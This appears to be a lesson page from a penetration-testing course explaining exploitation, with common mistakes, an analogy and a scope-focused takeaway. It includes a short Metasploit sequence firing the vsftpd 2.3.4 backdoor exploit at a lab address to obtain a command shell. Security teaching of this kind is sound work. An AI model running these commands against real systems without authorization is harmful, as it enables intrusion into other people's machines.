Module 08 › Chapter 8.7 › Exploitation: Purpose and Caution
Definition

Exploitation

Turning a vulnerability into practical access to demonstrate real risk and give a foothold for further testing.

Common mistakes
  • Running exploits without checking software version compatibility.
  • Using aggressive payloads when a proof-of-concept would suffice.
  • Not confirming scope or lacking a rollback plan.
Analogy

Think of exploitation as a controlled medical test: you apply a stimulus to confirm a condition, and you must minimize harm while collecting diagnostics.

Exploit example
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 10.0.2.15
# verify LHOST and LPORT
exploit
Example result

A successful run gives a command shell on the target. Record evidence and shift to safe post‑exploit checks.

Key takeaway

Prove impact with minimal side effects and always test in agreed scope.
